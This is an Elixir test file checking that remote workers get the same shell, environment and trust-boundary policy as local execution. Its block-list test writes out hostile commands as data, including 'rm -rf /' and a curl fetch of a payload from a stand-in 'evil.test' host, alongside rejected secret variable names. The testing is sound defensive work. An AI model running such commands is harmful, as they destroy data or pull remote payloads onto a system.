defmodule Tet.Runtime.Remote.PolicyParityTest do
  @moduledoc """
  BD-0056: Runtime integration verification for remote policy parity.

  These tests verify that the runtime remote execution path integrates
  with the core policy parity contract, ensuring that remote workers
  cannot bypass local gates at the runtime layer.
  """

  use ExUnit.Case, async: true

  alias Tet.Remote.PolicyParity
  alias Tet.Remote.TrustBoundary
  alias Tet.ShellPolicy
  alias Tet.PlanMode.Policy

  # ---------------------------------------------------------------------------
  # Helpers
  # ---------------------------------------------------------------------------

  defp shell_contract, do: ShellPolicy.shell_contract()

  defp read_contract do
    {:ok, contract} = Tet.Tool.ReadOnlyContracts.fetch("read")
    contract
  end

  # ===========================================================================
  # Integration: remote bootstrap context cannot bypass parity gates
  # ===========================================================================

  describe "remote bootstrap context and policy parity" do
    test "trusted_remote bootstrap context passes parity for read operations" do
      assert :ok =
               PolicyParity.check(%{
                 trust_level: :trusted_remote,
                 task_id: "t-heartbeat",
                 task_category: :acting,
                 mode: :execute
               })
    end

    test "untrusted_remote bootstrap context passes parity for status-only checks" do
      assert :ok =
               PolicyParity.check(%{
                 trust_level: :untrusted_remote,
                 task_id: "t-probe",
                 task_category: :acting,
                 mode: :execute
               })
    end

    test "untrusted_remote with command fails parity — trust boundary blocks execution" do
      assert {:error, {:parity_violation, {:trust_boundary_denied, _}}} =
               PolicyParity.check(%{
                 trust_level: :untrusted_remote,
                 task_id: "t-exec",
                 task_category: :acting,
                 mode: :execute,
                 command: ["mix", "test"]
               })
    end
  end

  # ===========================================================================
  # Integration: policy parity aligns with runtime Gate decisions
  # ===========================================================================

  describe "parity aligns with local Gate decisions" do
    test "when local Gate allows, parity also allows (read-only + plan mode)" do
      contract = read_contract()
      policy = Policy.default()
      context = %{mode: :plan, task_category: :researching, task_id: "t-001"}

      local_decision = Tet.PlanMode.Gate.evaluate(contract, policy, context)
      assert Tet.PlanMode.Gate.allowed?(local_decision)

      assert :ok =
               PolicyParity.check_category_gate(
                 Map.merge(context, %{
                   trust_level: :trusted_remote,
                   contract: contract
                 })
               )
    end

    test "when local Gate blocks, parity also blocks (mutating + plan mode)" do
      contract = shell_contract()
      policy = Policy.default()
      context = %{mode: :plan, task_category: :researching, task_id: "t-001"}

      local_decision = Tet.PlanMode.Gate.evaluate(contract, policy, context)
      assert Tet.PlanMode.Gate.blocked?(local_decision)

      assert {:error, {:parity_violation, {:category_gate_blocked, _}}} =
               PolicyParity.check_category_gate(
                 Map.merge(context, %{
                   trust_level: :trusted_remote,
                   contract: contract
                 })
               )
    end

    test "when local Gate allows acting + execute, parity allows for trusted_remote" do
      contract = shell_contract()
      policy = Policy.default()
      context = %{mode: :execute, task_category: :acting, task_id: "t-001"}

      local_decision = Tet.PlanMode.Gate.evaluate(contract, policy, context)
      assert Tet.PlanMode.Gate.allowed?(local_decision)

      assert :ok =
               PolicyParity.check_category_gate(
                 Map.merge(context, %{
                   trust_level: :trusted_remote,
                   contract: contract
                 })
               )
    end
  end

  # ===========================================================================
  # Integration: trust boundary never widens permissions
  # ===========================================================================

  describe "trust boundary is additive restriction, never widening" do
    test "local-only operations remain local-only regardless of remote context" do
      for operation <- TrustBoundary.local_only_operations() do
        assert {:ok, :local} = TrustBoundary.minimum_trust_for(operation)
      end
    end

    test "trusted_remote operations are a strict subset of local operations" do
      local_ops =
        TrustBoundary.trust_levels()
        |> Enum.filter(&(&1 == :local))
        |> Enum.flat_map(fn _ ->
          TrustBoundary.local_only_operations() ++
            TrustBoundary.trusted_remote_operations() ++
            TrustBoundary.untrusted_remote_operations()
        end)
        |> Enum.uniq()

      trusted_ops =
        TrustBoundary.trusted_remote_operations() ++ TrustBoundary.untrusted_remote_operations()

      for op <- trusted_ops do
        assert op in local_ops
      end

      for op <- TrustBoundary.local_only_operations() do
        refute op in trusted_ops
      end
    end

    test "untrusted_remote operations are a strict subset of trusted_remote operations" do
      untrusted_ops = TrustBoundary.untrusted_remote_operations()

      trusted_ops =
        TrustBoundary.trusted_remote_operations() ++ TrustBoundary.untrusted_remote_operations()

      for op <- untrusted_ops do
        assert op in trusted_ops
      end

      for op <- TrustBoundary.trusted_remote_operations() do
        refute op in untrusted_ops
      end
    end
  end

  # ===========================================================================
  # Integration: shell policy parity across execution sites
  # ===========================================================================

  describe "shell policy is identical for local and remote execution sites" do
    test "every command blocked locally is also blocked remotely" do
      blocked_commands = [
        ["rm", "-rf", "/"],
        ["curl", "http://evil.test/payload.sh"],
        ["bash", "-c", "whoami"],
        ["git", "bisect"],
        [],
        [""]
      ]

      for command <- blocked_commands do
        local_result = ShellPolicy.check_command(command)

        assert {:error, _} = local_result,
               "Expected #{inspect(command)} to be blocked by ShellPolicy"

        assert {:error, {:parity_violation, {:shell_command_blocked, _}}} =
                 PolicyParity.check_shell_policy(%{
                   trust_level: :trusted_remote,
                   task_id: "t-001",
                   task_category: :acting,
                   mode: :execute,
                   command: command
                 }),
               "Expected #{inspect(command)} to be blocked by PolicyParity for remote"
      end
    end

    test "every command allowed locally is also allowed remotely" do
      allowed_commands = [
        ["git", "status"],
        ["git", "log"],
        ["git", "diff"],
        ["mix", "test"],
        ["mix", "compile"],
        ["mix", "format"],
        ["git", "commit"],
        ["git", "push"]
      ]

      for command <- allowed_commands do
        assert {:ok, _risk} = ShellPolicy.check_command(command)

        assert :ok =
                 PolicyParity.check_shell_policy(%{
                   trust_level: :trusted_remote,
                   task_id: "t-001",
                   task_category: :acting,
                   mode: :execute,
                   command: command
                 })
      end
    end
  end

  # ===========================================================================
  # Integration: env policy parity across execution sites
  # ===========================================================================

  describe "env policy is identical for local and remote execution sites" do
    test "secret names rejected locally are also rejected remotely" do
      secret_names = [
        "AWS_SECRET_ACCESS_KEY",
        "DATABASE_URL",
        "API_KEY",
        "MY_PASSWORD",
        "AUTH_TOKEN",
        "PRIVATE_KEY",
        "CREDENTIAL_FILE"
      ]

      for name <- secret_names do
        assert {:error, _} = Tet.Remote.EnvPolicy.validate_allowlist([name])

        assert {:error, {:parity_violation, {:env_policy_denied, _}}} =
                 PolicyParity.check_env_policy(%{
                   trust_level: :trusted_remote,
                   task_id: "t-001",
                   task_category: :acting,
                   mode: :execute,
                   env_allowlist: [name],
                   env_map: %{}
                 })
      end
    end

    test "safe names accepted locally are also accepted remotely" do
      safe_names = ["PATH", "HOME", "LANG", "TERM", "TZ", "USER"]

      for name <- safe_names do
        assert {:ok, _} = Tet.Remote.EnvPolicy.validate_allowlist([name])

        assert :ok =
                 PolicyParity.check_env_policy(%{
                   trust_level: :trusted_remote,
                   task_id: "t-001",
                   task_category: :acting,
                   mode: :execute,
                   env_allowlist: [name],
                   env_map: %{}
                 })
      end
    end
  end

  # ===========================================================================
  # Integration: full parity check composed with runtime remote module
  # ===========================================================================

  describe "full parity check composed with runtime remote constraints" do
    test "trusted_remote + acting + shell contract + allowed command + approved passes" do
      assert :ok =
               PolicyParity.check(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 command: ["git", "status"],
                 contract: shell_contract(),
                 approval_status: :approved,
                 cwd: "/workspace/project",
                 workspace_root: "/workspace/project"
               })
    end

    test "untrusted_remote + acting + no command passes (status-only)" do
      assert :ok =
               PolicyParity.check(%{
                 trust_level: :untrusted_remote,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute
               })
    end

    test "local + acting + read contract passes (local is always at least as trusted)" do
      assert :ok =
               PolicyParity.check(%{
                 trust_level: :local,
                 task_id: "t-001",
                 task_category: :acting,
                 mode: :execute,
                 contract: read_contract()
               })
    end

    test "trusted_remote + plan + researching + read contract passes" do
      assert :ok =
               PolicyParity.check(%{
                 trust_level: :trusted_remote,
                 task_id: "t-001",
                 task_category: :researching,
                 mode: :plan,
                 contract: read_contract()
               })
    end
  end
end
